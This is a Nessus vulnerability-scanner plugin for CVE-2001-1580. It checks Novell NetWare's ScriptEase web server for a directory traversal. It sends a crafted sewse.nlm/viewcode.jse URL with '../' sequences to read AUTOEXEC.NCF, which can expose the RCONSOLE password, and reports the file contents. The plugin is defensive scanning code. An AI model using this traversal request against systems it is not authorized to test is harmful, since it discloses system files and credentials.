#
# This script was written by David Kyger <david_kyger@symantec.com>
#
# See the Nessus Scripts License for details
#

# Changes by Tenable:
# - Revised plugin title, OSVDB ref, output formatting, added see also, added solution (9/3/09)


include("compat.inc");

if(description)
{
  script_id(12048);
  script_version ("$Revision: 1.20 $");
  script_cvs_date("$Date: 2016/10/27 15:14:57 $");

  script_cve_id("CVE-2001-1580");
  script_bugtraq_id(3715);
  script_osvdb_id(5325);
 
  script_name(english:"Novell NetWare Web Server sewse.nlm (viewcode.jse) Traversal Arbitrary File Access");
  script_summary(english:"Checks for NetWare Web Server Source Disclosure");
 
  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a JavaScript application that is
affected by an information disclosure vulnerability." );
  script_set_attribute(attribute:"description", value:
"The installed version of Nombas ScriptEase Web Server Edition for
NetWare on the remote host fails to sanitize input to the 'sewse.nlm'
page and associated 'viewcode.jse' script before using it to display
the source code of a file. 

By passing in a specially crafted URL argument, an attacker can view
the contents of files, even files outside the web root.  This can lead
to disclosure of sensitive information from the affected host, such as
the RCONSOLE password located in AUTOEXEC.NCF." );
  # http://web.archive.org/web/20071023105035/http://www.irmplc.com/index.php/113-Advisory-002
  script_set_attribute(attribute:"see_also", value:"http://www.irmplc.com/index.php/113-Advisory-002");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2001/Dec/204");
  # http://web.archive.org/web/20011205063851/http://support.novell.com/servlet/tidfinder/2959615
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?837eab78");
  script_set_attribute(attribute:"solution", value:"Remove all sample scripts from the web server.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2001/12/12");
  script_set_attribute(attribute:"plugin_publication_date", value:"2004/02/06");
  script_set_attribute(attribute:"patch_publication_date", value:"2001/06/15");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2002-2016 David Kyger");

  script_family(english:"Netware");
  script_dependencie("http_version.nasl");
  script_require_ports("Services/www", 80);
  exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if (! get_port_state(port)) exit(0, "Port "+port+" is closed.");
 
   url = "/lcgi/sewse.nlm?sys:/novonyx/suitespot/docs/sewse/viewcode.jse+httplist+httplist/../../../../../system/autoexec.ncf";
   req = http_get(item:url, port:port);
   buf = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
   if (isnull(buf)) exit(1, "The web server on port "+port+" failed to respond.");

   lbuf = tolower(buf);
   if (
     "AUTOEXEC.NCF" >< buf &&
     (
       report_paranoia == 2 ||
       (
         "bind ipx to" >< lbuf ||
         "ipx internal net" >< lbuf ||
         "load remote " >< lbuf ||
         "set bindery context" >< lbuf ||
         "set time zone" >< lbuf
       )
     )
   )
   {
     if (report_verbosity > 0)
     {
       report = string(
         "\n",
         "Nessus was able to exploit the issue to retrieve the contents of\n",
         "'AUTOEXEC.NCF' on the remote host using the following URL :\n",
         "\n",
         "  ", build_url(port:port, qs:url), "\n"
       );
       if (report_verbosity > 1)
       {
         report += string(
           "\n",
           "Here are its contents :\n",
           "\n",
           crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
           buf,
           crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
         );
       }
       security_warning(port:port, extra:report);
     }
     else security_warning(port);
     exit(0);
    }

exit(0, "The web server listening on port "+port+" is not affected.");
